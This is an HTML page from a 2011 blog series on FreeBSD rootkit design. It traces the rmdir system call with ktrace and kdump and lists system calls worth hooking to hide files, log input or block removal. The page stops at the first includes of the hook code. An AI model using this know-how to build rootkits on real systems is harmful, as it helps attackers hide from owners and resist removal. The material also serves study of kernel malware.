@@ -1,0 +1,1182 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.16.5 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="UT" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example | Raging Scholar</title>
+<meta name="description" content="It has been a long time since I posted last note on system hooks and amkdir_hook example. A lot of things happened during these days and I just didn’tmanage to get back and post this one. As a matter of fact, the code for thisnote has been ready since at least a month ago. I don’t know whether there’sanyone waiting for me to update this series but I must admit that I feel bad tohad to pause it for a while. I’m glad that I finally have time again to work onthis">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="UTF_8">
+<meta property="og:site_name" content="Raging Scholar">
+<meta property="og:title" content="FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example">
+<meta property="og:url" content="http://localhost:4000/freebsd-rootkit-design-howtos-9-hook-kernel-process-tracking-and-rmdir-hook-example/">
+
+
+  <meta property="og:description" content="It has been a long time since I posted last note on system hooks and amkdir_hook example. A lot of things happened during these days and I just didn’tmanage to get back and post this one. As a matter of fact, the code for thisnote has been ready since at least a month ago. I don’t know whether there’sanyone waiting for me to update this series but I must admit that I feel bad tohad to pause it for a while. I’m glad that I finally have time again to work onthis">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2011-07-24T00:00:00+08:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/freebsd-rootkit-design-howtos-9-hook-kernel-process-tracking-and-rmdir-hook-example/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Hai Lang",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Raging Scholar Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Raging Scholar
+          <span class="site-subtitle">uprintf("There is no place like ::1");</span>
+        </a>
+        <ul class="visible-links"></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Hai Lang" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Hai Lang</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        An OCD Source Code Hygienist who has way too many hobbies, and way too keen to share his ideas.
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Xi'an, China</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:ragingscholar@protonmail.com">
+            <meta itemprop="email" content="ragingscholar@protonmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example">
+    <meta itemprop="description" content="It has been a long time since I posted last note on system hooks and amkdir_hook example. A lot of things happened during these days and I just didn’tmanage to get back and post this one. As a matter of fact, the code for thisnote has been ready since at least a month ago. I don’t know whether there’sanyone waiting for me to update this series but I must admit that I feel bad tohad to pause it for a while. I’m glad that I finally have time again to work onthis">
+    <meta itemprop="datePublished" content="July 24, 2011">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  11 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>It has been a long time since I posted last note on system hooks and a
+mkdir_hook example. A lot of things happened during these days and I just didn’t
+manage to get back and post this one. As a matter of fact, the code for this
+note has been ready since at least a month ago. I don’t know whether there’s
+anyone waiting for me to update this series but I must admit that I feel bad to
+had to pause it for a while. I’m glad that I finally have time again to work on
+this</p>
+
+<p>Nevertheless, I’m back. Enough talking about my personal issues, and let’s get
+right back to our topic, the long waiting kernel tracing and rmdir_hook example.</p>
+
+<h2 id="trace-the-kernel-calls">Trace the Kernel Calls</h2>
+
+<p>Let’s say you have this great idea you want to implement in your rootkit, it
+does the most despicable things and is as elusive as the shadow, but you may
+feel lost when you try to code this awesome idea – what are the system calls I
+should hook to implement certain functionalities?</p>
+
+<p>Fret not, we can trace the kernel calls to find out what system calls are called
+when certain actions are performed. For example, what are the system calls
+involved when the host establishes a new TPC connection?</p>
+
+<p>There are only two simple commands involved here for us to track a kernel
+behavior, ktrace and kdump.</p>
+
+<p><code class="highlighter-rouge">ktrace</code> requires a parameter to pass which should be an executable action that
+you want the system to perform. Once the action’s done, a trace output file will
+be generated. And then we can utilize <code class="highlighter-rouge">kdump</code> to view a list of all kernel calls
+when performing the command we specified earlier. Let’s see an example now.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZFSTest# <span class="nb">cd</span> /tmp
+ZFSTest# mkdir test_folder
+ZFSTest# ktrace rmdir test_folder
+ZFSTest# <span class="nb">ls</span>
+.ICE-unix       .XIM-unix       conftest.osav       ktrace.out      mysql.sock      <span class="nb">test</span>
+.X11-unix       .font-unix      conftest.sav        make_fifo_KyuyJ99a2 rmtest
+ZFSTest#
+</code></pre></div></div>
+
+<p>What we did was we firstly created a testing folder called <strong><em>test_folder</em></strong> and
+then removed the folder by using <strong><em>rmdir</em></strong> command and traced the kernel
+activities while we issued the command. A trace result was generated and saved
+in the current working folder called <strong><em>ktrace.out</em></strong>.</p>
+
+<p>Please keep in mind that in order for ktrace to successfully and fully get your
+desired result, the command you issued should complete successfully in the first
+place. Which means, if we plan to see what happens when we delete a folder, and
+we don’t specify which folder to delete, then we won’t be able to trace the
+actual folder-deleting kernel call since it wasn’t triggered at all. For
+example, we can’t get the information about the folder-deleting kernel call if
+we issued the following command.</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ZFSTest</span><span class="err">#</span> <span class="n">ktrace</span> <span class="n">rmdir</span>
+<span class="n">usage</span><span class="o">:</span> <span class="n">rmdir</span> <span class="p">[</span><span class="o">-</span><span class="n">pv</span><span class="p">]</span> <span class="n">directory</span> <span class="p">...</span>
+<span class="n">ZFSTest</span><span class="err">#</span>
+</code></pre></div></div>
+
+<p>That’s because the rmdir command exits straight away after printing the help
+information on the screen since it didn’t receive any folder to delete, so that
+the folder-deleting function was not called, and obviously not in the ktrace.out
+file.</p>
+
+<p>Let’s now take a look at the output file by issuing kdump command which by
+default will look for ktrace.out file in current working directory.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZFSTest# kdump | less
+  2769 ktrace   RET   ktrace 0
+  2769 ktrace   CALL  execve<span class="o">(</span>0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28<span class="o">)</span>
+  2769 ktrace   NAMI  <span class="s2">"/sbin/rmdir"</span>
+  2769 ktrace   RET   execve <span class="nt">-1</span> errno 2 No such file or directory
+  2769 ktrace   CALL  execve<span class="o">(</span>0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28<span class="o">)</span>
+  2769 ktrace   NAMI  <span class="s2">"/bin/rmdir"</span>
+  2769 ktrace   NAMI  <span class="s2">"/libexec/ld-elf.so.1"</span>
+  2769 rmdir    RET   execve 0
+  2769 rmdir    CALL  mmap<span class="o">(</span>0,0x8000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0<span class="o">)</span>
+  2769 rmdir    RET   mmap 34365181952/0x800531000
+  2769 rmdir    CALL  issetugid
+  2769 rmdir    RET   issetugid 0
+
+...
+...
+
+  2769 rmdir    RET   <span class="nb">read </span>128/0x80
+  2769 rmdir    CALL  lseek<span class="o">(</span>0x3,0x80,SEEK_SET<span class="o">)</span>
+  2769 rmdir    RET   lseek 128/0x80
+  2769 rmdir    CALL  <span class="nb">read</span><span class="o">(</span>0x3,0x800534000,0x42<span class="o">)</span>
+
+...
+...
+
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_SETMASK,0x8006394d0,0<span class="o">)</span>
+  2769 rmdir    RET   sigprocmask 0
+  2769 rmdir    CALL  rmdir<span class="o">(</span>0x7fffffffed5e<span class="o">)</span>
+  2769 rmdir    NAMI  <span class="s2">"test_folder"</span>
+  2769 rmdir    RET   rmdir 0
+
+...
+...
+
+  2769 rmdir    CALL  <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span>
+</code></pre></div></div>
+
+<p>There were many different system calls performed when we deleted the
+test_folder, but the one that we concern most should be rmdir system call
+at 2769. If you only want to get a name of the system call of a specific
+command, like what we want here, you can even filter the result by searching
+keyword CALL to only concentrate on system calls and their names.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZFSTest# kdump | <span class="nb">grep </span>CALL
+  2769 ktrace   CALL  execve<span class="o">(</span>0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28<span class="o">)</span>
+  2769 ktrace   CALL  execve<span class="o">(</span>0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28<span class="o">)</span>
+  2769 rmdir    CALL  mmap<span class="o">(</span>0,0x8000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0<span class="o">)</span>
+  2769 rmdir    CALL  issetugid
+  2769 rmdir    CALL  open<span class="o">(</span>0x80052ca92,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x1b6<span class="o">)</span>
+  2769 rmdir    CALL  open<span class="o">(</span>0x80052bba9,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x2f<span class="o">)</span>
+  2769 rmdir    CALL  <span class="nb">read</span><span class="o">(</span>0x3,0x7fffffffe040,0x80<span class="o">)</span>
+  2769 rmdir    CALL  lseek<span class="o">(</span>0x3,0x80,SEEK_SET<span class="o">)</span>
+  2769 rmdir    CALL  <span class="nb">read</span><span class="o">(</span>0x3,0x800534000,0x42<span class="o">)</span>
+  2769 rmdir    CALL  close<span class="o">(</span>0x3<span class="o">)</span>
+  2769 rmdir    CALL  access<span class="o">(</span>0x800535000,0&lt;F_OK&gt;<span class="o">)</span>
+  2769 rmdir    CALL  open<span class="o">(</span>0x800532040,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x63a5e0<span class="o">)</span>
+  2769 rmdir    CALL  fstat<span class="o">(</span>0x3,0x7fffffffe2c0<span class="o">)</span>
+  2769 rmdir    CALL  pread<span class="o">(</span>0x3,0x8006395c0,0x1000,0<span class="o">)</span>
+  2769 rmdir    CALL  mmap<span class="o">(</span>0,0x248000,0&lt;PROT_NONE&gt;,0x21002&lt;MAP_PRIVATE|MAP_ANON|MAP_NOCORE&gt;,0xffffffff,0<span class="o">)</span>
+  2769 rmdir    CALL  mmap<span class="o">(</span>0x800647000,0x10e000,0x5&lt;PROT_READ|PROT_EXEC&gt;,0x20012&lt;MAP_PRIVATE|MAP_FIXED|MAP_NOCORE&gt;,0x3,0<span class="o">)</span>
+  2769 rmdir    CALL  mmap<span class="o">(</span>0x800854000,0x1f000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x12&lt;MAP_PRIVATE|MAP_FIXED&gt;,0x3,0x10d000<span class="o">)</span>
+  2769 rmdir    CALL  mprotect<span class="o">(</span>0x800873000,0x1c000,0x3&lt;PROT_READ|PROT_WRITE&gt;<span class="o">)</span>
+  2769 rmdir    CALL  close<span class="o">(</span>0x3<span class="o">)</span>
+  2769 rmdir    CALL  sysarch<span class="o">(</span>0x81,0x7fffffffe3a0<span class="o">)</span>
+  2769 rmdir    CALL  munmap<span class="o">(</span>0x800538000,0x1000<span class="o">)</span>
+  2769 rmdir    CALL  mmap<span class="o">(</span>0,0x19000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_BLOCK,0x8006394c0,0x7fffffffe370<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_SETMASK,0x8006394d0,0<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_BLOCK,0x8006394c0,0x7fffffffe340<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_SETMASK,0x8006394d0,0<span class="o">)</span>
+  2769 rmdir    CALL  rmdir<span class="o">(</span>0x7fffffffed5e<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_BLOCK,0x8006394c0,0x7fffffffe990<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_SETMASK,0x8006394d0,0<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_BLOCK,0x8006394c0,0x7fffffffe940<span class="o">)</span>
+  2769 rmdir    CALL  sigprocmask<span class="o">(</span>SIG_SETMASK,0x8006394d0,0<span class="o">)</span>
+  2769 rmdir    CALL  <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span>
+</code></pre></div></div>
+
+<h3 id="how-about-some-invincible-folders-sir">How About Some Invincible Folders, Sir?</h3>
+
+<p>As what we can see from above results, the rmdir seems to be the final call
+which the kernel actually performs the deleting operation. So give our goal is
+to have non-deletable folders, which obviously, by hooking rmdir system calls,
+we can make certain folders survive from deletion. It is important for rootkits
+to not be detected and removed so easily, now let’s jump right into in.</p>
+
+<p>One may argue that the user can delete a folder with many different commands, such
+as rm -r or what if rm -rf? Will the system call the same for all
+folder-deleting operations even if they were issued by different command? The
+answer is yes.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ZFSTest# mkdir test_folder
+ZFSTest# ktrace rm <span class="nt">-rf</span> test_folder/
+ZFSTest#
+</code></pre></div></div>
+
+<p>We may get different system call routines, but will surely end up with this:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+...
+  2824 rm       CALL  close<span class="o">(</span>0x3<span class="o">)</span>
+  2824 rm       CALL  access<span class="o">(</span>0x800537000,0&lt;F_OK&gt;<span class="o">)</span>
+  2824 rm       CALL  open<span class="o">(</span>0x800534040,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x63c5e0<span class="o">)</span>
+...
+...
+  2824 rm       CALL  close<span class="o">(</span>0x4<span class="o">)</span>
+  2824 rm       CALL  fchdir<span class="o">(</span>0x3<span class="o">)</span>
+  2824 rm       CALL  rmdir<span class="o">(</span>0x800c10100<span class="o">)</span>
+...
+...
+  2824 rm       CALL  <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span>
+</code></pre></div></div>
+
+<p>As you can see, the system call that actually did the deletion is still rmdir.
+In fact, most of the kernel calls are simple and reusable, may be used by
+multiple different userland applications. Here’s a list of command system calls
+from the book.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>System Call</th>
+      <th>Possible Purpose of Hooking</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>read, readv, pread, preadv</td>
+      <td>Logging Input</td>
+    </tr>
+    <tr>
+      <td>write, writev, pwrite, pwritev</td>
+      <td>Logging Output</td>
+    </tr>
+    <tr>
+      <td>open</td>
+      <td>Hiding File Contents</td>
+    </tr>
+    <tr>
+      <td>unlink</td>
+      <td>Preventing File Removal</td>
+    </tr>
+    <tr>
+      <td>chdir</td>
+      <td>Preventing Directory Traversal</td>
+    </tr>
+    <tr>
+      <td>chmod</td>
+      <td>Preventing File Mode Modification</td>
+    </tr>
+    <tr>
+      <td>chown</td>
+      <td>Preventing Ownership Change</td>
+    </tr>
+    <tr>
+      <td>kill</td>
+      <td>Preventing Signal Sending</td>
+    </tr>
+    <tr>
+      <td>ioctl</td>
+      <td>Manipulating ioctl Request</td>
+    </tr>
+    <tr>
+      <td>execve</td>
+      <td>Redirecting File Execution</td>
+    </tr>
+    <tr>
+      <td>rename</td>
+      <td>Preventing File Renaming</td>
+    </tr>
+    <tr>
+      <td>rmdir</td>
+      <td>Preventing Directory Removal</td>
+    </tr>
+    <tr>
+      <td>stat, lstat</td>
+      <td>Hiding File Status</td>
+    </tr>
+    <tr>
+      <td>getdirentries</td>
+      <td>Hiding Files</td>
+    </tr>
+    <tr>
+      <td>truncate</td>
+      <td>Preventing file Truncating or Extending</td>
+    </tr>
+    <tr>
+      <td>kldload</td>
+      <td>Preventing Module Loading</td>
+    </tr>
+    <tr>
+      <td>kldunload</td>
+      <td>Preventing Module Unloading</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="how-does-kernel-delete-folders">How Does Kernel Delete Folders</h3>
+
+<p>So before we actually starting working on our rmdir hooking code, we need to
+firstly understand how the original rmdir function works. The source code of
+rmdir command is available at: /usr/src/bin/rmdir/rmdir.c.</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="c">#if 0
+    #ifndef lint
+    static char const copyright[] =
+    "@(#) Copyright (c) 1992, 1993, 1994n
+            The Regents of the University of California.  All rights reserved.n";
+    #endif /* not lint */
+
+    #ifndef lint
+    static char sccsid[] = "@(#)rmdir.c     8.3 (Berkeley) 4/2/94";
+    #endif /* not lint */
+    #endif
+</span>    <span class="cp">#include &lt;sys/cdefs.h&gt;
+</span>    <span class="n">__FBSDID</span><span class="p">(</span><span class="s">"$FreeBSD: head/bin/rmdir/rmdir.c 140851 2005-01-26 06:51:28Z ssouhlal $"</span><span class="p">);</span>
+
+    <span class="cp">#include &lt;err.h&gt;
+</span>    <span class="cp">#include &lt;stdio.h&gt;
+</span>    <span class="cp">#include &lt;stdlib.h&gt;
+</span>    <span class="cp">#include &lt;string.h&gt;
+</span>    <span class="cp">#include &lt;unistd.h&gt;
+</span>
+    <span class="k">static</span> <span class="kt">int</span> <span class="n">rm_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span>
+    <span class="k">static</span> <span class="kt">void</span> <span class="n">usage</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+
+    <span class="k">static</span> <span class="kt">int</span> <span class="n">pflag</span><span class="p">;</span>
+    <span class="k">static</span> <span class="kt">int</span> <span class="n">vflag</span><span class="p">;</span>
+
+    <span class="kt">int</span>
+    <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+    <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">ch</span><span class="p">,</span> <span class="n">errors</span><span class="p">;</span>
+
+        <span class="k">while</span> <span class="p">((</span><span class="n">ch</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">"pv"</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">switch</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="sc">'p'</span><span class="p">:</span>
+                <span class="n">pflag</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="sc">'v'</span><span class="p">:</span>
+                <span class="n">vflag</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="sc">'?'</span><span class="p">:</span>
+            <span class="nl">default:</span>
+                <span class="n">usage</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">argc</span> <span class="o">-=</span> <span class="n">optind</span><span class="p">;</span>
+        <span class="n">argv</span> <span class="o">+=</span> <span class="n">optind</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">usage</span><span class="p">();</span>
+
+        <span class="k">for</span> <span class="p">(</span><span class="n">errors</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">*</span><span class="n">argv</span><span class="p">;</span> <span class="n">argv</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">rmdir</span><span class="p">(</span><span class="o">*</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">warn</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+                <span class="n">errors</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">vflag</span><span class="p">)</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"%sn"</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">pflag</span><span class="p">)</span>
+                <span class="n">errors</span> <span class="o">|=</span> <span class="n">rm_path</span><span class="p">(</span><span class="o">*</span><span class="n">argv</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">errors</span><span class="p">);</span>
+    <span class="p">}</span>
+
+
+    <span class="k">static</span> <span class="kt">int</span>
+    <span class="nf">rm_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span>
+    <span class="p">{</span>
+            <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+
+            <span class="n">p</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">path</span><span class="p">);</span>
+            <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">p</span> <span class="o">&gt;</span> <span class="n">path</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">)</span>
+                    <span class="p">;</span>
+            <span class="o">*++</span><span class="n">p</span> <span class="o">=</span> <span class="sc">'�'</span><span class="p">;</span>
+            <span class="k">while</span> <span class="p">((</span><span class="n">p</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">'/'</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* Delete trailing slashes. */</span>
+                    <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">p</span> <span class="o">&gt;=</span> <span class="n">path</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">)</span>
+                            <span class="p">;</span>
+                    <span class="o">*++</span><span class="n">p</span> <span class="o">=</span> <span class="sc">'�'</span><span class="p">;</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">path</span><span class="p">)</span>
+                            <span class="k">break</span><span class="p">;</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="n">rmdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="n">warn</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+                            <span class="k">return</span> <span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="n">vflag</span><span class="p">)</span>
+                            <span class="n">printf</span><span class="p">(</span><span class="s">"%sn"</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">static</span> <span class="kt">void</span>
+    <span class="nf">usage</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+    <span class="p">{</span>
+
+            <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"usage: rmdir [-pv] directory ...n"</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The code is simple. It calls rmdir straight away with path specified unless
+pflag was provided to delete every component in the path specified. So now what
+we need to do is simply hooking rmdir system call.</p>
+
+<h2 id="the-rmdir_hook--summary">The rmdir_hook &amp; Summary</h2>
+
+<p>This is pretty much all we need to know about kernel activity tracing. We’ve
+successfully hunted down the final call which FreeBSD kernel utilizes to delete
+a folder, looked at it’s source code and understood how it works. Now let’s
+actually code the hook to prevent our folders from being deleted by rmdir system
+call.</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/proc.h&gt;
+#include &lt;sys/module.h&gt;
+#include &lt;sys/sysent.h&gt;
+#include &lt;sys/kernel.h&gt; //New
+#include &lt;sys/systm.h&gt;
